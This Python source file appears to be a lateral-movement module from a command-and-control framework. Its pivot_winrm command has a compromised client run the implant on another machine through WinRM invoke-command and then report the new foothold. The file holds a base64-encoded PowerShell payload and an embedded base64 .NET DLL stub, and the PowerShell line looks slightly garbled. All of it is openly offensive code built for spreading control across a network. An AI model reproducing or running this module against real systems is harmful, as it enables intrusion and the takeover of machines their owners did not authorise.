import base64

from modules.base import BaseModule, ClientModuleNotLoaded


class Module(BaseModule):
    MODULE_NAME = 'pivoting'
    CLIENT_TYPE_POWERSHELL = 0
    CLIENT_TYPE_CSHARP = 1

    def __init__(self):
        self.running = False

    @staticmethod
    def get_commands() -> [[str]]:
        return [
            ['pivot_winrm', '<client> <remote_host> <mode>', 'Executes an instance of the client in the remote host.\nMode should be: [direct, relay]']
        ]

    def get_client_code(self, client_type):

        if client_type == self.CLIENT_TYPE_POWERSHELL:
            return base64.b64encode('''
                        try {
                            if ($args[0].action -eq 'winrm') {
                                invoke-command -asjob -computername $args[0].remote_host -ArgumentList $server, $null, $client $client
                                $response = @{ "service" = "pivoting"; "result" = "executed" }
                                Send-Message -Msg $response -To $args[2]
                            }
                        } catch {
                            Write-Log $PSItem.Exception.Message;
                            $response = @{"service" = "pivoting"; "result" = $PSItem.Exception.Message; }
                            Send-Message -Msg $response -To $args[2]
                        }
                    ''').decode()
        elif client_type == self.CLIENT_TYPE_CSHARP:
            return 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDADl3A/QAAAAAAAAAAOAAIiALATAAAAgAAAAGAAAAAAAAXicAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAYIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAAknAABPAAAAAEAAADADAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAAAkJgAAVAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAZAcAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAADADAAAAQAAAAAQAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAADgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAA9JwAAAAAAAEgAAAACAAUAfCAAAKgFAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB4CewEAAAQqJgIoDQAACgAAKgAAEzABAAsAAAABAAARAHIBAABwCisABioAQlNKQgEAAQAAAAAADAAAAHY0LjAuMzAzMTkAAAAABQBsAAAA6AEAACN+AABUAgAASAIAACNTdHJpbmdzAAAAAJwEAAAUAAAAI1VTALAEAAAQAAAAI0dVSUQAAADABAAA6AAAACNCbG9iAAAAAAAAAAIAAAFXFaIBCQAAAAD6ATMAFgAAAQAAAA8AAAACAAAAAQAAAAMAAAACAAAADQAAAA0AAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAAAAMUBAQAAAAAABgAzAQ0CBgCFAQ0CBgByAPoBDwAtAgAABgC4AKsBBgBsAdsBBgAUAdsBBgDRANsBBgDuANsBBgBTAdsBBgChANsBBgA8AtQBBgBXAA0CBgBAAPoBBgCGAPoBAAAAAAEAAAAAAAEAAQABABAALAAsADEAAQABACEACgAoAFAgAAAAAIEINwArAAEAWCAAAAAAhhj0AS8AAQBkIAAAAACWAKMBNQADAAAAAQDtAQAAAgBDAgkA9AEBABEA9AEGABkA9AEKACkA9AEQADEA9AEQADkA9AEQAEEA9AEQAEkA9AEQAFEA9AEQAFkA9AEQAGkA9AEGAHkA9AEVAGEA9AEGACAAWwDYACEAWwDYACEAYwDdAC4ACwA9AC4AEwBGAC4AGwBlAC4AIwBuAC4AKwClAC4AMwC1AC4AOwDAAC4AQwDNAC4ASwClAC4AUwClABsAAgABAAAAOwA5AAIAAQADAASAAAABAAAAAAAAAAAAAAAAACwAAAACAAAAAAAAAAAAAAAfACAAAAAAAAAAAAAAPE1vZHVsZT4APE5hbWU+a19fQmFja2luZ0ZpZWxkAG5ldHN0YW5kYXJkAEJhc2VNb2R1bGUAZ2V0X05hbWUARGVidWdnZXJCcm93c2FibGVTdGF0ZQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAERlYnVnZ2VyQnJvd3NhYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAVGFyZ2V0RnJhbWV3b3JrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlJbmZvcm1hdGlvbmFsVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAEV4ZWN1dGUAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBCYXNlTW9kdWxlLmRsbABTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24Ac2VydmVyAC5jdG9yAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01v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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=='

    def run(self, command):
        if command.startswith('pivot_winrm'):
            self.pivot_winrm(command)

    def pivot_winrm(self, command):

        client_id_or_name = command.split(' ')[1]
        remote_host = command.split(' ')[2]
        mode = command.split(' ')[3]

        print('[*] Trying to execute client in {} with Winrm.'.format(remote_host))
        client_id = self.c2_manager.get_client_id_by_client_name(client_id_or_name)
        self.c2_manager.master_connection.send_service(client_id, self.MODULE_NAME, {'action': 'winrm', 'remote_host': remote_host, 'mode': mode})
        response = self.c2_manager.master_connection.recv_service_response(client_id, self.MODULE_NAME)

        if response is None:
            return

        if 'error' in response and response['error'] == ClientModuleNotLoaded.CLIENT_ERROR_CODE_MODULE_NOT_FOUND and 'client_type' in response:
            raise ClientModuleNotLoaded(client_id, self.MODULE_NAME, response['client_type'])

        if response['result'] == 'executed':
            print('[+] Client started in {} with Winrm. Check connected clients.'.format(remote_host))
